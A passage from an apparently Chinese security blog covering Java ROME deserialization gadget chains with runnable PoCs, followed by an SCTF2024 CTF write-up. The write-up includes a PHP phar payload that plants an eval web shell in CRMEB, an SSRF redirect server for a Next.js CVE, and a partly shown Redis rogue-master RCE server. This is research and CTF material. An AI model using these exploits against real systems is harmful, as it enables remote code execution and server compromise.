alt=\"image-20220309223412701\"></p>\n<p>看看这个ToStringBean的toString()方法干了什么</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/308a4bde28192b332f9b5d0f0b8f6feb.png\" alt=\"image-20220309223242536\"></p>\n<p>最后调用了私有的toString，再调用 <strong>BeanIntrospector.getPropertyDescriptors()</strong>, 查了一下, 作用是获取类属性的getter和setter。</p>\n<p>接着通过获取的属性写入<strong>pds</strong>，调用<strong>pds[i]</strong> 的 getName() 和 getReadMethod() 来获取方法名，和方法，最后invoke，调用的方法是 <strong>无参函数</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/db8b86bc16cc8b9575a15c0756386e02.png\" alt=\"image-20220309223453415\"></p>\n<p>跟进 getPropertyDescriptors(), 如果传入的Class在 <strong>_introspected</strong> 这个Map里面没有找到, 就调用getPDs()然后添加到 _introspected </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/fa78a26ab736366fd4dd3f7f65fa5b3d.png\" alt=\"image-20220309224419675\"></p>\n<p>跟进getPDs(), 发现调用了它的重构方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/2f2484e044114b60c83cd3b59b90d99f.png\" alt=\"image-20220309224650068\"></p>\n<p>getPDs，这里获取setter和getter。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/3eec67392d891fef1e60628ba4c35a58.png\" alt=\"image-20220309225404782\"></p>\n<p>回到toString, 通过for循环,经getName 和 getReadMethod 来获取方法名，和方法，接着invoke进行调用，调用 getter 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/dc6e4f15bc3d373bd09aa78faad72ae9.png\" alt=\"image-20220309225732277\"></p>\n<p>就可以使用 TemplateImpl 中的 <strong>getOutputProperties() 方法就是类成员变量 _outputProperties 的 getter 方法</strong>, 来动态加载字节码。</p>\n<p>所以，<strong>ToStringBean 的 toString 最后可以利用TemplateImpl加载字节码</strong></p>\n<p>链子后半段利用已经完成，需要找到上半段链子为入口</p>\n<h2 id=\"BadAttributeValueExpException\"><a href=\"#BadAttributeValueExpException\" class=\"headerlink\" title=\"BadAttributeValueExpException\"></a>BadAttributeValueExpException</h2><p>CC5中利用的点</p>\n<blockquote>\n<p>在 <strong>BadAttributeValueExpException</strong>的 <strong>readObject</strong> 中调用 valObj 的 <strong>toString</strong> 方法 而 <strong>valObj是通过获取val的值来进行赋值</strong>，也就是可控</p>\n</blockquote>\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ROME</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//TemplateImpl 动态加载字节码</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = ClassPool.getDefault().get(<span class=\"string\">&quot;bytecode.Calc&quot;</span>).toBytecode();</span><br><span class=\"line\"></span><br><span class=\"line\">        TemplatesImpl obj = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        <span class=\"comment\">// setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        ToStringBean bean = <span class=\"keyword\">new</span> ToStringBean(Templates.class, obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        BadAttributeValueExpException badAttributeValueExpException = <span class=\"keyword\">new</span> BadAttributeValueExpException(<span class=\"number\">123</span>);</span><br><span class=\"line\">        setFieldValue(badAttributeValueExpException, <span class=\"string\">&quot;val&quot;</span>, bean);</span><br><span class=\"line\">        <span class=\"comment\">//serialize(badAttributeValueExpException);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">            FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">            ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">            oos.writeObject(obj);</span><br><span class=\"line\">            oos.close();</span><br><span class=\"line\"><span class=\"comment\">//          ByteArrayOutputStream baos = new ByteArrayOutputStream();</span></span><br><span class=\"line\"><span class=\"comment\">//          ObjectOutputStream oos = new ObjectOutputStream(baos);</span></span><br><span class=\"line\"><span class=\"comment\">//          oos.writeObject(badAttributeValueExpException);</span></span><br><span class=\"line\"><span class=\"comment\">//          oos.close();</span></span><br><span class=\"line\"><span class=\"comment\">//          System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">            FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">            ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">            Object obj = ois.readObject();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\"><span class=\"comment\">//          ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span></span><br><span class=\"line\"><span class=\"comment\">//          ObjectInputStream ois = new ObjectInputStream(bais);</span></span><br><span class=\"line\"><span class=\"comment\">//          ois.readObject();</span></span><br><span class=\"line\"><span class=\"comment\">//          ois.close();</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ObjectBean\"><a href=\"#ObjectBean\" class=\"headerlink\" title=\"ObjectBean\"></a>ObjectBean</h2><p>这来源于ysoserial 的利用链，看调用链就完事了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;**</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * TemplatesImpl.getOutputProperties()</span><br><span class=\"line\"> * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class=\"line\"> * NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class=\"line\"> * DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class=\"line\"> * Method.invoke(Object, Object...)</span><br><span class=\"line\"> * ToStringBean.toString(String)</span><br><span class=\"line\"> * ToStringBean.toString()</span><br><span class=\"line\"> * ObjectBean.toString()</span><br><span class=\"line\"> * EqualsBean.beanHashCode()</span><br><span class=\"line\"> * ObjectBean.hashCode()</span><br><span class=\"line\"> * HashMap&lt;K,V&gt;.hash(Object)</span><br><span class=\"line\"> * HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @author mbechler</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ROME</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//TemplateImpl 动态加载字节码</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = ClassPool.getDefault().get(<span class=\"string\">&quot;bytecode.Calc&quot;</span>).toBytecode();</span><br><span class=\"line\"></span><br><span class=\"line\">        TemplatesImpl obj = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        <span class=\"comment\">// setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        ToStringBean bean = <span class=\"keyword\">new</span> ToStringBean(Templates.class, obj);</span><br><span class=\"line\">        ObjectBean objectBean = <span class=\"keyword\">new</span> ObjectBean(String.class,<span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap map = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        <span class=\"comment\">//Hashtable map = new Hashtable();</span></span><br><span class=\"line\">        map.put(objectBean,<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">        setFieldValue(objectBean,<span class=\"string\">&quot;_equalsBean&quot;</span>,<span class=\"keyword\">new</span> EqualsBean(ToStringBean.class,bean));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//serialize(map);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">            FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">            ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">            oos.writeObject(obj);</span><br><span class=\"line\">            oos.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">            FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">            ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">            Object obj = ois.readObject();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>除了 HashMap 里有 hashCode() 方法的调用，还有  <strong>Hashtable</strong> 这个类的 readObject 方法也存在 <strong>hashCode()</strong> 的调用</p>\n<h1 id=\"EqualsBean\"><a href=\"#EqualsBean\" class=\"headerlink\" title=\"EqualsBean\"></a>EqualsBean</h1><p>在EqualsBean 里，可以找到相似ToStringBean 的利用，<strong>beanEquals</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/26b9dbf09517440fa3fe0c64ab8476e9.png\" alt=\"image-20220309235105549\"></p>\n<p>向上发现equals调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/b9fe66fb1a8ef9da302a54c81603dce0.png\" alt=\"image-20220309235456126\"></p>\n<p>等于说后半段已经找好，需要找调用equals的前半段链子，CC7中，存在调用equals，这样前半段找好</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/5c07d2a68225bd69166d37f722508eb7.png\" alt=\"image-20220309235622621\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ROME</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//TemplateImpl 动态加载字节码</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = ClassPool.getDefault().get(<span class=\"string\">&quot;bytecode.Calc&quot;</span>).toBytecode();</span><br><span class=\"line\"></span><br><span class=\"line\">        TemplatesImpl obj = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        <span class=\"comment\">// setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class=\"line\">        setFieldValue(obj, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        EqualsBean bean = <span class=\"keyword\">new</span> EqualsBean(String.class,<span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap map1 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        HashMap map2 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        map1.put(<span class=\"string\">&quot;yy&quot;</span>,bean);</span><br><span class=\"line\">        map1.put(<span class=\"string\">&quot;zZ&quot;</span>,obj);</span><br><span class=\"line\">        map2.put(<span class=\"string\">&quot;zZ&quot;</span>,bean);</span><br><span class=\"line\">        map2.put(<span class=\"string\">&quot;yy&quot;</span>,obj);</span><br><span class=\"line\">        Hashtable table = <span class=\"keyword\">new</span> Hashtable();</span><br><span class=\"line\">        table.put(map1,<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">        table.put(map2,<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(bean,<span class=\"string\">&quot;_beanClass&quot;</span>,Templates.class);</span><br><span class=\"line\">        setFieldValue(bean,<span class=\"string\">&quot;_obj&quot;</span>,obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(table);</span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">            FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">            ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">            oos.writeObject(obj);</span><br><span class=\"line\">            oos.close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">            FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">            ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">            Object obj = ois.readObject();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.yuque.com/jinjinshigekeaigui/qskpi5/cz1um4#N8UKH\">Java安全之ROME反序列化利用分析</a></p>\n","categories":["Java反序列化"]},{"title":"SCTF2024","url":"/2024/10/02/SCTF2024/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/bg.jpg\" alt=\"bg\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"Simpleshop\"><a href=\"#Simpleshop\" class=\"headerlink\" title=\"Simpleshop\"></a>Simpleshop</h1><blockquote>\n<p>Recently, my e-commerce site has been illegally invaded, hackers through a number of means to achieve the purchase of zero actually free of charge to buy a brand new Apple / Apple iPad, you can help me to find out where the problem is?</p>\n</blockquote>\n<p><a href=\"https://avd.aliyun.com/detail?id=AVD-2024-6943%E3%80%81https://avd.aliyun.com/detail?id=AVD-2024-6944\">https://avd.aliyun.com/detail?id=AVD-2024-6943、https://avd.aliyun.com/detail?id=AVD-2024-6944</a><br>CRMEB 5.4.0 0day，根据漏洞通报定位漏洞函数：get_image_base64，本地审计梳理利用链为：前台用户上传文件，phar反序列化RCE</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152601211.png\" alt=\"image-20241002152601211\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152622197.png\" alt=\"image-20241002152622197\"></p>\n<p>文件内容有检查，通过gzip压缩生成的phar文件即可绕过</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152722897.png\" alt=\"image-20241002152722897\"></p>\n<p>poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace GuzzleHttp\\Cookie&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    class SetCookie &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        function __construct()</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $this-&gt;data[&#39;Expires&#39;] &#x3D; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;</span><br><span class=\"line\">            $this-&gt;data[&#39;Discard&#39;] &#x3D; 0;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class CookieJar&#123;</span><br><span class=\"line\">        private $cookies &#x3D; [];</span><br><span class=\"line\">        private $strictMode;</span><br><span class=\"line\">        function __construct() &#123;</span><br><span class=\"line\">            $this-&gt;cookies[] &#x3D; new SetCookie();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class FileCookieJar extends CookieJar &#123;</span><br><span class=\"line\">        private $filename;</span><br><span class=\"line\">        private $storeSessionCookies;</span><br><span class=\"line\">        function __construct() &#123;</span><br><span class=\"line\">            parent::__construct();</span><br><span class=\"line\">            $this-&gt;filename &#x3D; &quot;public&#x2F;y0.php&quot;;</span><br><span class=\"line\">            $this-&gt;storeSessionCookies &#x3D; true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace&#123;</span><br><span class=\"line\">    $exp &#x3D; new GuzzleHttp\\Cookie\\FileCookieJar();</span><br><span class=\"line\">\tvar_dump($exp);</span><br><span class=\"line\"></span><br><span class=\"line\">    $phar &#x3D; new Phar(&#39;test.phar&#39;);</span><br><span class=\"line\">    $phar -&gt; stopBuffering();</span><br><span class=\"line\">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class=\"line\">    $phar -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);</span><br><span class=\"line\">    $phar -&gt; setMetadata($exp);</span><br><span class=\"line\">    $phar -&gt; stopBuffering();</span><br><span class=\"line\">    rename(&#39;test.phar&#39;,&#39;test.jpg&#39;);\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上传：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152913622.png\" alt=\"image-20241002152913622\"></p>\n<p>触发：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152945220.png\" alt=\"image-20241002152945220\"></p>\n<p>蚁剑-&gt; fpm bypass df -&gt; suid读flag</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002154043595.png\" alt=\"image-20241002154043595\"></p>\n<h1 id=\"ezjump\"><a href=\"#ezjump\" class=\"headerlink\" title=\"ezjump\"></a>ezjump</h1><blockquote>\n<p>Just jump!</p>\n</blockquote>\n<p>通过源码结构及flag文件位置，猜测是通过前端走私/SSRF到后端然后打redis的RCE</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002161111322.png\" alt=\"image-20241002161111322\"></p>\n<p>通过依赖检查发现Next.js存在一个SSRF的洞，<a href=\"https://github.com/azu/nextjs-CVE-2024-34351%EF%BC%8C%E9%80%9A%E8%BF%87%E4%B8%80%E4%B8%AASSRF\">https://github.com/azu/nextjs-CVE-2024-34351，通过一个SSRF</a> server和修改Host Origin头即可</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002161324826.png\" alt=\"image-20241002161324826\"></p>\n<p>SSRF server：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, Response, redirect</span><br><span class=\"line\"></span><br><span class=\"line\">app &#x3D; Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#39;&#x2F;play&#39;)</span><br><span class=\"line\">def exploit():</span><br><span class=\"line\">    # CORS preflight check</span><br><span class=\"line\">    if request.method &#x3D;&#x3D; &#39;HEAD&#39;:</span><br><span class=\"line\">        response &#x3D; Response()</span><br><span class=\"line\">        response.headers[&#39;Content-Type&#39;] &#x3D; &#39;text&#x2F;x-component&#39;</span><br><span class=\"line\">        return response</span><br><span class=\"line\">    # after CORS preflight check</span><br><span class=\"line\">    elif request.method &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class=\"line\">        ssrfUrl &#x3D; &#39;http:&#x2F;&#x2F;172.11.0.3:5000&#x2F;&#39;</span><br><span class=\"line\">        return redirect(ssrfUrl)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class=\"line\">    app.run(port&#x3D;1337, host&#x3D;&#39;0.0.0.0&#39;, debug&#x3D;True)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002164210894.png\" alt=\"image-20241002164210894\"></p>\n<p>在get_user时，会对redis发起 RESP 请求</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002172512348.png\" alt=\"image-20241002172512348\"></p>\n<p>可以直接打主从复制rce，构造fake server</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import socket</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">def RogueServer(lport):</span><br><span class=\"line\">    resp &#x3D; &quot;&quot;</span><br><span class=\"line\">    sock&#x3D;socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    sock.bind((&quot;0.0.0.0&quot;,lport))</span><br><span class=\"line\">    sock.listen(10)</span><br><span class=\"line\">    conn,address &#x3D; sock.accept()  </span><br><span class=\"line\">    sleep(5)</span><br><span class=\"line\">    while True:    </span><br><span class=\"line\">        data &#x3D; conn.recv(1024)</span><br><span class=\"line\">        if &quot;PING&quot; in data:</span><br><span class=\"line\">            resp&#x3D;&quot;+PONG&quot;+CLRF</span><br><span class=\"line\">            conn.send(resp)</span><br><span class=\"line\">        elif &quot;REPLCONF&quot; in data:</span><br><span class=\"line\">            resp&#x3D;&quot;+OK&quot;+CLRF</span><br><span class=\"line\">            conn.send(resp)</span><br><span class=\"line\">        elif &quot;PSYNC&quot; in data or &quot;SYNC&quot; in data:</span><br><span class=\"line\">            resp &#x3D;  &quot;+FULLRESYNC &quot; + &quot;Z&quot;*40 + &quot; 1&quot; + CLRF</span><br><span class=\"line\">            resp +&#x3D; 